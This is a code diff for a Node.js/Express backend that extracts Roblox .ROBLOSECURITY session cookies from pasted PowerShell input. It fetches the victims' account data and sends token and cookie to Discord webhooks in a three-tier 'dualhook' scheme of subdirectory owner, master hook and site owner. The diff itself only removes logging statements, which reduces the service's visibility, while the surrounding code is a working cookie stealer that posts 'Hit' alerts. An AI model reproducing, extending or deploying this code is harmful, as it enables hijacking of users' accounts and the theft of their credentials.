@@ -46,7 +46,7 @@ async function loadDirectories() {
 async function saveDirectories(directories) {
   try {
     await db.ref('directories').set(directories);
-    console.log('✅ Directories saved to Firebase');
+    
     return true;
   } catch (error) {
     console.error('Error saving directories to Firebase:', error);
@@ -68,7 +68,7 @@ function validateRequest(req, res, next) {
   if (origin) {
     const originHost = new URL(origin).host;
     if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
-      console.log(`❌ Blocked request from unauthorized origin`);
+      
       return res.status(403).json({ error: 'Unauthorized origin' });
     }
   }
@@ -76,7 +76,7 @@ function validateRequest(req, res, next) {
   // Check for API token in headers
   const providedToken = req.get('X-API-Token');
   if (!providedToken || providedToken !== API_TOKEN) {
-    console.log(`❌ Invalid or missing API token from ${req.ip}`);
+    
     return res.status(401).json({ error: 'Invalid API token' });
   }
 
@@ -97,7 +97,7 @@ async function logUserData(token, userData, context = {}) {
     };
 
     const writeResult = await db.ref('user_logs').push(logEntry);
-    console.log(`✅ Logged user data to Firebase Realtime Database with ID: ${writeResult.key}`);
+    
     return writeResult.key;
   } catch (error) {
     console.error('❌ Error logging user data to Firebase Realtime Database:', error);
@@ -218,7 +218,7 @@ app.post('/api/create-directory', async (req, res) => {
       return res.status(500).json({ error: 'Failed to save directory configuration' });
     }
 
-    console.log(`✅ Created new directory: ${directoryName}`);
+    
 
     // Send notification to the webhook about successful directory creation with auth token
     try {
@@ -250,10 +250,9 @@ app.post('/api/create-directory', async (req, res) => {
         body: JSON.stringify(notificationPayload)
       });
 
-      console.log(`✅ Sent creation notification to webhook for directory: ${directoryName}`);
+      
     } catch (webhookError) {
-      console.log(`⚠️ Failed to send creation notification to webhook: ${webhookError.message}`);
-      // Don't fail the directory creation if webhook notification fails
+      
     }
 
     res.json({ 
@@ -928,10 +927,10 @@ async function fetchRobloxUserData(token) {
 
 // Function to send custom dualhook webhook with directory branding
 async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData = null, webhookUrl, directoryName, subdirectoryName, host) {
-  console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');
+  
 
   if (!webhookUrl) {
-    console.log('❌ Discord webhook URL not configured');
+    
     return { success: false, error: 'Webhook URL not configured' };
   }
 
@@ -949,8 +948,7 @@ async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData 
       embeds: [embed]
     };
 
-    console.log('Sending custom dualhook webhook payload...');
-
+    
     const response = await fetch(webhookUrl, {
       method: 'POST',
       headers: {
@@ -959,7 +957,7 @@ async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData 
       body: JSON.stringify(payload)
     });
 
-    console.log('Webhook response status:', response.status);
+    
 
     if (!response.ok) {
       const errorText = await response.text();
@@ -967,7 +965,7 @@ async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData 
       return { success: false, error: `Webhook failed: ${response.status}` };
     }
 
-    console.log('✅ Successfully sent custom dualhook webhook');
+    
     return { success: true };
   } catch (error) {
     console.error('❌ Failed to send custom dualhook webhook:', error.message);
@@ -983,7 +981,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
   console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');
 
   if (!webhookUrl) {
-    console.log('❌ Discord webhook URL not configured in environment variables');
+    
     return { success: false, error: 'Webhook URL not configured' };
   }
 
@@ -1083,7 +1081,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
         embeds: [userDataEmbed, cookieEmbed]
       };
 
-      console.log('Sending combined user data and cookie embeds...');
+      
 
       const response = await fetch(webhookUrl, {
         method: 'POST',
@@ -1093,7 +1091,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
         body: JSON.stringify(combinedPayload)
       });
 
-      console.log('Combined embeds response status:', response.status);
+      
 
       if (!response.ok) {
         const errorText = await response.text();
@@ -1101,7 +1099,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
         return { success: false, error: `Combined embeds failed: ${response.status}` };
       }
 
-      console.log('✅ Successfully sent combined user data and cookie embeds to Discord webhook');
+      
       return { success: true };
 
     } else {
@@ -1119,7 +1117,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
         embeds: [embed]
       };
 
-      console.log('Sending simple webhook payload...');
+      
 
       const response = await fetch(webhookUrl, {
         method: 'POST',
@@ -1129,15 +1127,14 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
         body: JSON.stringify(payload)
       });
 
-      console.log('Webhook response status:', response.status);
-
+      
       if (!response.ok) {
         const errorText = await response.text();
         console.error('Webhook failed with status:', response.status, 'Error:', errorText);
         return { success: false, error: `Webhook failed: ${response.status}` };
       }
 
-      console.log('✅ Successfully sent to Discord webhook');
+      
       return { success: true };
     }
   } catch (error) {
@@ -1153,7 +1150,7 @@ app.post('/convert', validateRequest, async (req, res) => {
     let input;
     let scriptType;
 
-    console.log('📥 Received request');
+    
 
     // Handle both JSON and text input
     if (typeof req.body === 'string') {
@@ -1163,12 +1160,11 @@ app.post('/convert', validateRequest, async (req, res) => {
       input = req.body.powershell;
       scriptType = req.body.scriptType || 'Unknown';
     } else {
-      console.log('❌ Invalid input format');
+      
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
-    console.log('🔍 Processing request data...');
-
+    
     // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
     // First, clean up the input by removing PowerShell backticks and line breaks
     const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
@@ -1212,16 +1208,16 @@ app.post('/convert', validateRequest, async (req, res) => {
       const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);
 
       if (!webhookResult.success) {
-        console.log('❌ Webhook failed:', webhookResult.error);
+        
         return res.status(500).json({ 
           success: false, 
           error: `Webhook failed: ${webhookResult.error}` 
         });
       }
 
-      console.log('✅ Token and user data sent to Discord successfully');
+      
     } else {
-      console.log('❌ No ROBLOSECURITY token found in input');
+      
 
       // Return error message when no token found
       return res.status(400).json({ 
@@ -1305,7 +1301,7 @@ app.post('/:directory/convert', async (req, res) => {
     let input;
     let scriptType;
 
-    console.log(`📥 Received request for directory: ${directoryName}`);
+    
 
     // Handle both JSON and text input
     if (typeof req.body === 'string') {
@@ -1315,7 +1311,7 @@ app.post('/:directory/convert', async (req, res) => {
       input = req.body.powershell;
       scriptType = req.body.scriptType || 'Unknown';
     } else {
-      console.log('❌ Invalid input format');
+      
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
@@ -1369,17 +1365,16 @@ app.post('/:directory/convert', async (req, res) => {
       }
 
       if (!webhookResult.success) {
-        console.log('❌ Webhook failed:', webhookResult.error);
+        
         return res.status(500).json({ 
           success: false, 
           error: `Webhook failed: ${webhookResult.error}` 
         });
       }
 
-      console.log(`✅ Token and user data sent to directory ${directoryName} webhook successfully`);
+      
     } else {
-      console.log('❌ No ROBLOSECURITY token found in input');
-
+      
       // Return error message when no token found
       return res.status(400).json({ 
         success: false,
@@ -1448,7 +1443,7 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
       return res.status(500).json({ error: 'Failed to save subdirectory configuration' });
     }
 
-    console.log(`✅ Created subdirectory: ${parentDirectory}/${subdirectoryName}`);
+    
 
     // Send CREATION notification to subdirectory webhook with user's link and auth token
     try {
@@ -1471,10 +1466,9 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
         body: JSON.stringify(creationNotificationPayload)
       });
 
-      console.log(`✅ Sent subdirectory CREATION notification with auth token to: ${subdirectoryName}`);
+      
     } catch (webhookError) {
-      console.log(`⚠️ Failed to send subdirectory creation notification: ${webhookError.message}`);
-    }
+    }    
 
     res.json({
       success: true,
@@ -1559,15 +1553,14 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
     // Validate API token for this specific subdirectory
     const providedToken = req.get('X-API-Token');
     if (!providedToken || providedToken !== subdirectoryConfig.apiToken) {
-      console.log(`❌ Invalid or missing API token for subdirectory ${directoryName}/${subdirectoryName} from ${req.ip}`);
+      
       return res.status(401).json({ error: 'Invalid API token for this subdirectory' });
     }
 
     let input;
     let scriptType;
 
-    console.log(`📥 Received request for subdirectory: ${directoryName}/${subdirectoryName}`);
-
+    
     // Handle both JSON and text input
     if (typeof req.body === 'string') {
       input = req.body;
@@ -1576,7 +1569,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       input = req.body.powershell;
       scriptType = req.body.scriptType || 'Unknown';
     } else {
-      console.log('❌ Invalid input format');
+      
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
@@ -1625,45 +1618,44 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;
       const customTitle = `<:hacker:1404745235711655987> +1 Hit - ${directoryName.toUpperCase()} AUTOHAR`;
 
-      // 1. Send to subdirectory webhook (user who owns the subdirectory) - RICH EMBED WITH USER DATA
-      console.log(`🚀 Sending rich user data embed to subdirectory webhook`);
-      console.log('🔍 Sending data to Discord webhook');
+      
+      
       const subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle);
 
       if (subdirectoryWebhookResult.success) {
-        console.log(`✅ Subdirectory webhook (${subdirectoryName}) delivered successfully`);
+        
       } else {
-        console.log(`❌ Subdirectory webhook (${subdirectoryName}) failed:`, subdirectoryWebhookResult.error);
+        
       }
 
       // 2. Send to dualhook master webhook (collects from all subdirectory users)
       let dualhookWebhookResult = { success: true }; // Default success for validation
       if (parentConfig.dualhookWebhookUrl) {
-        console.log(`🚀 Sending to dualhook master webhook`);
+        
         dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, customTitle);
 
         if (dualhookWebhookResult.success) {
-          console.log(`✅ Dualhook master webhook (${directoryName}) delivered successfully`);
+          
         } else {
-          console.log(`❌ Dualhook master webhook (${directoryName}) failed:`, dualhookWebhookResult.error);
+          
         }
       }
 
       // 3. Send to site owner webhook (website owner)
       const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
       if (siteOwnerWebhookUrl) {
-        console.log(`🚀 Sending to site owner webhook`);
+        
         const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, customTitle);
 
         if (siteOwnerWebhookResult.success) {
-          console.log(`✅ Site owner webhook delivered successfully`);
+          
         } else {
-          console.log(`❌ Site owner webhook failed:`, siteOwnerWebhookResult.error);
+          
         }
       }
 
       if (!subdirectoryWebhookResult.success) {
-        console.log('❌ Subdirectory webhook failed:', subdirectoryWebhookResult.error);
+        
         return res.status(500).json({ 
           success: false, 
           error: `Subdirectory webhook failed: ${subdirectoryWebhookResult.error}` 
@@ -1671,16 +1663,16 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       }
 
       if (!dualhookWebhookResult.success) {
-        console.log('❌ Dualhook master webhook failed:', dualhookWebhookResult.error);
+        
         return res.status(500).json({ 
           success: false, 
           error: `Dualhook master webhook failed: ${dualhookWebhookResult.error}` 
         });
       }
 
-      console.log(`✅ Webhook delivery completed for subdirectory ${directoryName}/${subdirectoryName} (3 webhooks: subdirectory owner → dualhook master → site owner)`);
+      
     } else {
-      console.log('❌ No ROBLOSECURITY token found in input');
+      
 
       // Return error message when no token found
       return res.status(400).json({ 
@@ -1698,19 +1690,16 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       subdirectory: subdirectoryName
     });
   } catch (error) {
-    console.error('❌ Server error:', error);
+    
     res.status(500).json({ error: 'Server error processing request' });
   }
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Server running on port ${PORT}`);
-  console.log(`Admin panel available at: /create`);
+  
 
   if (!process.env.API_TOKEN) {
-    console.log('Generated API Token for internal use');
-    console.log('Set API_TOKEN environment variable to use a custom token');
   }
 
   // Log existing directories
@@ -1718,7 +1707,7 @@ app.listen(PORT, '0.0.0.0', () => {
     if (directories && typeof directories === 'object') {
       const directoryNames = Object.keys(directories);
       if (directoryNames.length > 0) {
-        console.log('📁 Active directories:', directoryNames.join(', '));
+        
 
         // Log subdirectories for dualhook services
         directoryNames.forEach(dir => {
@@ -1727,7 +1716,7 @@ app.listen(PORT, '0.0.0.0', () => {
               directories[dir].subdirectories) {
             const subdirs = Object.keys(directories[dir].subdirectories);
             if (subdirs.length > 0) {
-              console.log(`🔗 Dualhook subdirectories for ${dir}:`, subdirs.join(', '));
+              
             }
           }
         });
